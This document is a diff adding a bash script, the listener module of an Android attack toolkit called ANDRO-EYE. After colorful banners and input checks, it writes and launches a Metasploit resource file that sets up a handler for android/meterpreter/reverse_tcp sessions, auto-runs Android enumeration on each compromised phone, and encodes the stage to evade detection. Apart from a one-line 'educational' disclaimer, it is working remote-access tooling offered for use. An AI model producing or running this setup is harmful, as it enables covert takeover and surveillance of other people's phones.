@@ -1,0 +1,307 @@
+#!/bin/bash
+# Written in Bash
+# "ONLY FOR EDUCATIONAL PURPOSE"
+# METASPLOIT LISTENER MODULE - ANDRO-EYE
+
+# Color codes
+RED='\033[0;91m'
+GREEN='\033[0;92m'
+YELLOW='\033[0;93m'
+BLUE='\033[0;94m'
+PURPLE='\033[0;95m'
+CYAN='\033[0;96m'
+WHITE='\033[0;97m'
+NC='\033[0m' # No Color
+BOLD='\033[1m'
+UNDERLINE='\033[4m'
+BLINK='\033[5m'
+
+# Animation functions
+loading_animation() {
+    local message=$1
+    local chars="⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
+    
+    echo -ne "${CYAN}${BOLD}$message ${NC}"
+    for i in {1..15}; do
+        for char in $(echo $chars | grep -o .); do
+            echo -ne "${YELLOW}${BOLD}$char${NC}"
+            sleep 0.05
+            echo -ne "\b"
+        done
+    done
+    echo -e "${GREEN}${BOLD} Done! ${NC}"
+}
+
+progress_bar() {
+    local duration=$1
+    local message=$2
+    
+    echo -ne "${BLUE}${BOLD}$message ${NC}"
+    for i in {1..20}; do
+        echo -ne "${GREEN}${BOLD}▓${NC}"
+        sleep $(echo "scale=2; $duration/20" | bc 2>/dev/null || echo "0.05")
+    done
+    echo -e "${GREEN}${BOLD} Complete! ${NC}"
+}
+
+sparkle_effect() {
+    echo -ne "${YELLOW}"
+    for i in {1..15}; do
+        echo -ne "✦"
+        sleep 0.03
+    done
+    echo -e "${NC}"
+}
+
+pulse_message() {
+    local message=$1
+    local color=$2
+    
+    for i in {1..3}; do
+        echo -ne "${color}${BOLD}$message${NC}"
+        sleep 0.2
+        echo -ne "\r"
+        for j in $(seq 1 ${#message}); do
+            echo -n " "
+        done
+        echo -ne "\r"
+        sleep 0.2
+    done
+    echo -e "${color}${BOLD}$message${NC}"
+}
+
+typewriter_effect() {
+    local text=$1
+    local color=$2
+    for ((i=0; i<${#text}; i++)); do
+        echo -ne "${color}${BOLD}${text:$i:1}${NC}"
+        sleep 0.03
+    done
+    echo
+}
+
+# Function to validate IP address
+validate_ip() {
+    local ip=$1
+    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
+        # Check each octet
+        IFS='.' read -r -a octets <<< "$ip"
+        for octet in "${octets[@]}"; do
+            if [ $octet -gt 255 ] || [ $octet -lt 0 ]; then
+                return 1
+            fi
+        done
+        return 0
+    else
+        return 1
+    fi
+}
+
+# Function to validate port
+validate_port() {
+    local port=$1
+    if [[ $port =~ ^[0-9]+$ ]] && [ $port -ge 1 ] && [ $port -le 65535 ]; then
+        return 0
+    else
+        return 1
+    fi
+}
+
+# Check for Metasploit
+if ! which msfconsole > /dev/null; then
+    pulse_message "❌ Metasploit Framework not found!" "${RED}"
+    echo -e "${YELLOW}${BOLD}Please install Metasploit first using the main installer${NC}"
+    sleep 3
+    exit 1
+fi
+
+# Create metasploit directory if it doesn't exist
+mkdir -p metasploit 2>/dev/null
+
+# Clear screen and show banner
+clear
+echo -e "${RED}${BOLD}"
+cat << "EOF"
+    
+███╗   ███╗███████╗████████╗ █████╗ ███████╗██████╗ ██╗      ██████╗  
+████╗ ████║██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔══██╗██║     ██╔═══██╗ 
+██╔████╔██║█████╗     ██║   ███████║███████╗██████╔╝██║     ██║   ██║ 
+██║╚██╔╝██║██╔══╝     ██║   ██╔══██║╚════██║██╔═══╝ ██║     ██║   ██║ 
+██║ ╚═╝ ██║███████╗   ██║   ██║  ██║███████║██║     ███████╗╚██████╔╝ 
+╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝     ╚══════╝ ╚═════╝  
+                                                                   
+🎧 ${GREEN}LISTENER MODULE${RED} - ${CYAN}Metasploit Console${RED}                 
+   
+EOF
+echo -e "${NC}"
+sparkle_effect
+
+echo -e "\n${PURPLE}${BOLD}╔════════════════════════════════════════════════════════╗${NC}"
+echo -e "${PURPLE}${BOLD}║           METASPLOIT REVERSE TCP LISTENER              ║${NC}"
+echo -e "${PURPLE}${BOLD}╚════════════════════════════════════════════════════════╝${NC}\n"
+
+# Function to get LHOST with validation
+lhost_taker() {
+    while true; do
+        echo -ne "\n${CYAN}${BOLD}🌐 Enter LHOST (IP address)${NC} ${WHITE}➤${NC} ${YELLOW}"
+        read lhost2
+        echo -ne "${NC}"
+        
+        if [ -z "$lhost2" ]; then
+            pulse_message "❌ IP address cannot be empty!" "${RED}"
+        elif ! validate_ip "$lhost2"; then
+            pulse_message "❌ Invalid IP address format!" "${RED}"
+            echo -e "${WHITE}Example: ${GREEN}192.168.1.100${NC}"
+        else
+            echo -e "${GREEN}${BOLD}✓ Valid IP address${NC}"
+            break
+        fi
+    done
+}
+
+# Function to get LPORT with validation
+lport_taker() {
+    while true; do
+        echo -ne "\n${PURPLE}${BOLD}🔌 Enter LPORT (1-65535)${NC} ${WHITE}➤${NC} ${YELLOW}"
+        read lport2
+        echo -ne "${NC}"
+        
+        if [ -z "$lport2" ]; then
+            pulse_message "❌ Port number cannot be empty!" "${RED}"
+        elif ! validate_port "$lport2"; then
+            pulse_message "❌ Invalid port number! Must be 1-65535" "${RED}"
+        else
+            echo -e "${GREEN}${BOLD}✓ Valid port number${NC}"
+            break
+        fi
+    done
+}
+
+# Function to create listener resource file
+listner_creator() {
+    echo -e "\n${BLUE}${BOLD}⚙️  Creating Metasploit resource file...${NC}"
+    progress_bar 2 "Generating listener configuration"
+    
+    # Create resource file with timestamp
+    timestamp=$(date +"%Y%m%d_%H%M%S")
+    rc_file="metasploit/listener_${timestamp}.rc"
+    
+    cat > "$rc_file" << EOF
+# Metasploit Listener Configuration
+# Generated by ANDRO-EYE on $(date)
+# LHOST: $lhost2
+# LPORT: $lport2
+
+use exploit/multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+set LHOST $lhost2
+set LPORT $lport2
+set ExitOnSession false
+set AutoRunScript post/android/multi/enum
+set EnableStageEncoding true
+set StageEncoder x86/shikata_ga_nai
+set SessionLogging true
+
+# Start the listener
+exploit -j
+
+# Show active sessions
+sessions -l
+
+EOF
+    
+    if [ $? -eq 0 ]; then
+        echo -e "${GREEN}${BOLD}✓ Resource file created: ${WHITE}$rc_file${NC}"
+        
+        # Show configuration summary
+        echo -e "\n${YELLOW}${BOLD}════════════════════════════════════════════${NC}"
+        echo -e "${CYAN}${BOLD}📋 Configuration Summary:${NC}"
+        echo -e "${WHITE}  LHOST: ${GREEN}$lhost2${NC}"
+        echo -e "${WHITE}  LPORT: ${GREEN}$lport2${NC}"
+        echo -e "${WHITE}  Payload: ${GREEN}android/meterpreter/reverse_tcp${NC}"
+        echo -e "${WHITE}  RC File: ${GREEN}$rc_file${NC}"
+        echo -e "${YELLOW}${BOLD}════════════════════════════════════════════${NC}"
+    else
+        pulse_message "❌ Failed to create resource file!" "${RED}"
+        exit 1
+    fi
+}
+
+# Function to start the listener
+start_listner() {
+    while true; do
+        echo -ne "\n${YELLOW}${BOLD}🎧 Start Metasploit listener now? ${WHITE}(Y/n) ${YELLOW}➤ ${RED}"
+        read yn
+        echo -ne "${NC}"
+        
+        case ${yn,,} in
+            n|no)
+                echo -e "\n${BLUE}${BOLD}⏩ Returning to main menu...${NC}"
+                sleep 1
+                clear
+                bash modules/function2.sh
+                return
+                ;;
+            *)
+                echo -e "\n${GREEN}${BOLD}🚀 Starting Metasploit console...${NC}"
+                sparkle_effect
+                echo -e "\n${PURPLE}${BOLD}╔════════════════════════════════════════════════════════╗${NC}"
+                echo -e "${PURPLE}${BOLD}║              METASPLOIT CONSOLE ACTIVE                  ║${NC}"
+                echo -e "${PURPLE}${BOLD}╚════════════════════════════════════════════════════════╝${NC}\n"
+                sleep 2
+                
+                # Use the latest resource file
+                latest_rc=$(ls -t metasploit/listener_*.rc 2>/dev/null | head -1)
+                if [ -n "$latest_rc" ]; then
+                    msfconsole -q -r "$latest_rc"
+                else
+                    msfconsole -q -r "metasploit/.exploit.rc"
+                fi
+                break
+                ;;
+        esac
+    done
+}
+
+# Main function
+main() {
+    echo -e "\n${PURPLE}${BOLD}🔧 Configuring Metasploit Listener${NC}"
+    typewriter_effect "Please provide the connection details..." "${CYAN}"
+    
+    lhost_taker
+    lport_taker
+    listner_creator
+    start_listner
+}
+
+# Run main function
+main
+
+# After listener exits, ask to return to menu
+echo -e "\n${YELLOW}${BOLD}════════════════════════════════════════════════════════${NC}"
+echo -e "\n${GREEN}${BOLD}✅ Metasploit session ended${NC}"
+
+while true; do
+    echo -ne "\n${CYAN}${BOLD}❓ Clear screen and return to main menu? ${WHITE}(Y/n) ${CYAN}➤ ${RED}"
+    read yn
+    echo -ne "${NC}"
+    
+    case ${yn,,} in
+        n|no)
+            echo -e "\n${BLUE}${BOLD}⏩ Exiting to shell...${NC}"
+            exit 0
+            ;;
+        *)
+            echo -e "\n${PURPLE}${BOLD}🧹 Clearing screen...${NC}"
+            progress_bar 1 "Please wait"
+            clear
+            if [ -f "modules/function2.sh" ]; then
+                bash modules/function2.sh
+            else
+                echo -e "${RED}${BOLD}❌ Main menu not found!${NC}"
+                exit 1
+            fi
+            break
+            ;;
+    esac
+done
